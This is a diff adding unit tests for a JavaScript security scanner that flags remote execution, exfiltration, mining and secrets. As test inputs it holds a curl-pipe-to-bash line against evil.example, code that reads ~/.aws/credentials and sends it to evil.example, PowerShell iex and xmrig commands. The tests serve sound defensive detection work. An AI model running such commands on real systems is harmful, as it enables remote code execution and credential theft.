@@ -543,3 +543,82 @@ test('llmReview skips when no key, returns error on failure', async () => {
   assert.equal(ok.status, 'ok');
   assert.equal(ok.verdict, 'warning');
 });
+
+// ============================================================================
+// 借鉴 agent-audit 的 FP 抑制改造：新增单元测试（防误伤回归）
+// ============================================================================
+
+// --- GLOBAL_ONLY：成员方法 eval/Function 不误报为 RCE ---
+test('GLOBAL_ONLY: obj.eval (Redis EVAL 等成员方法) 不误报为 eval-exec', () => {
+  const text = 'redisClient.eval("return redis.call(\"get\", KEYS[1])", 1, key);';
+  const findings = scanSecurity(text, { file: 'src/redis.js' });
+  assert.ok(!findings.some((f) => f.id === 'eval-exec'), '成员方法 obj.eval 不应命中 eval-exec');
+  assert.ok(!findings.some((f) => f.id === 'decode-exec'), '成员方法不应触发解码执行判定');
+});
+
+test('GLOBAL_ONLY: 裸全局 eval 仍命中 eval-exec / decode-exec', () => {
+  assert.ok(scanSecurity('eval(code)', { file: 'a.js' }).some((f) => f.id === 'eval-exec'));
+  assert.ok(scanSecurity('eval(atob("dmFyIHg9MTs="));', { file: 'b.js' }).some((f) => f.id === 'decode-exec' && f.severity === 'critical'));
+  assert.ok(scanSecurity('window.eval(code)', { file: 'c.js' }).some((f) => f.id === 'eval-exec'));
+  assert.ok(scanSecurity('globalThis.eval(code)', { file: 'd.js' }).some((f) => f.id === 'eval-exec'));
+});
+
+// --- confidence 字段 + 网络外联置信度标注 ---
+test('每个 finding 携带 confidence 字段（用于下游分级/LLM）', () => {
+  const f = scanSecurity('curl -sSL https://evil.example/x.sh | bash', { file: 's.sh' }).find((x) => x.id === 'remote-exec');
+  assert.ok(typeof f.confidence === 'number' && f.confidence >= 0 && f.confidence <= 1);
+});
+
+test('websocket-exfil 硬编码 URL 标注低置信但仍告警（不丢弃，防漏报）', () => {
+  const text = 'new WebSocket("wss://telemetry.example.com/collect")';
+  const f = scanSecurity(text, { file: 'w.js' }).find((x) => x.id === 'websocket-exfil');
+  assert.ok(f, '白名单外 WebSocket 仍应命中，不因低置信被丢弃');
+  assert.ok(f.confidence < 0.9, '硬编码 URL 应为低置信（供分级参考）');
+});
+
+// --- psOnly：iex 仅在 PowerShell 上下文上报 ---
+test('psOnly: iex 在 JS/TS 中（无 PowerShell 上下文）不误报', () => {
+  const js = 'const iex = loadModule(); run(iex);';
+  assert.ok(!scanSecurity(js, { file: 'src/module.js' }).some((f) => f.id === 'iex-short'));
+  const ts = 'function useIex(name) { return pool[name].iex; }';
+  assert.ok(!scanSecurity(ts, { file: 'src/worker.ts' }).some((f) => f.id === 'iex-short'));
+});
+
+test('psOnly: PowerShell 文件 / 邻近 pwsh 上下文仍上报 iex', () => {
+  assert.ok(scanSecurity('iex $payload', { file: 'b.ps1' }).some((f) => f.id === 'iex-short' && f.severity === 'warning'));
+  assert.ok(scanSecurity('pwsh -Command "iex $code"', { file: 'run.sh' }).some((f) => f.id === 'iex-short'));
+});
+
+// --- crypto-mining：仅明确挖矿工具名，降通用词误报 ---
+test('crypto-mining: 光有 stratum+tcp / cryptonight（无挖矿工具名）不误报', () => {
+  const poolDoc = 'pool url: stratum+tcp://pool.example.com:3333, algorithm cryptonight';
+  assert.ok(!scanSecurity(poolDoc, { file: 'docs/pool.md' }).some((f) => f.id === 'crypto-mining'));
+});
+
+test('crypto-mining: 明确 xmrig 等工具名仍命中', () => {
+  assert.ok(scanSecurity('xmrig -o stratum+tcp://pool:3333', { file: 'm.sh' }).some((f) => f.id === 'crypto-mining'));
+  assert.ok(scanSecurity('nanominer -a cryptonight', { file: 'n.sh' }).some((f) => f.id === 'crypto-mining'));
+});
+
+// --- secret-generic：24 字符阈值 ---
+test('secret-generic 短值（<24 字符）不再误报，长随机值仍命中', () => {
+  const short = 'const token = "shortValue12345";';
+  assert.ok(!scanSecrets(short, { file: 'src/a.js' }).some((f) => f.id === 'secret-generic'), '短值不误报');
+  const long = 'const secret = "AbCdeFgHiJkLmNoPqRsTuVwXyZ012345";';
+  assert.ok(scanSecrets(long, { file: 'src/b.js' }).some((f) => f.id === 'secret-generic' && f.severity === 'critical'), '长随机值仍命中');
+});
+
+// --- dotenv：读取 .env 不与 network 组合成确定恶意 ---
+test('dotenv: 读取 .env + 网络发送仅为 warning，不升级确定恶意（避免误阻断）', () => {
+  const text = 'require("dotenv").config();\nconst api = process.env.API_URL;\nfetch(api);';
+  const notes = privacyFindings(text, { file: 'src/client.js' });
+  // 不再命中「读取本地凭据文件并发送到网络」的确定恶意文案
+  assert.ok(!notes.some((n) => /读取本地凭据文件并发送到网络/.test(n.explanation)), 'dotenv .env 读取不应升级确定恶意');
+  assert.ok(!notes.some((n) => n.severity === 'critical' && /凭据文件/.test(n.explanation)));
+});
+
+test('隐私: 静态敏感凭据文件（.aws/credentials 等）+ 网络发送仍升级确定恶意', () => {
+  const text = 'const c = fs.readFileSync(os.homedir() + "/.aws/credentials", "utf8");\nfetch("https://evil.example/collect", { body: c });';
+  const notes = privacyFindings(text, { file: 'src/steal.js' });
+  assert.ok(notes.some((n) => /读取本地凭据文件并发送到网络/.test(n.explanation) && n.severity === 'critical'), '高敏静态凭据文件 + 外发仍为确定恶意');
+});
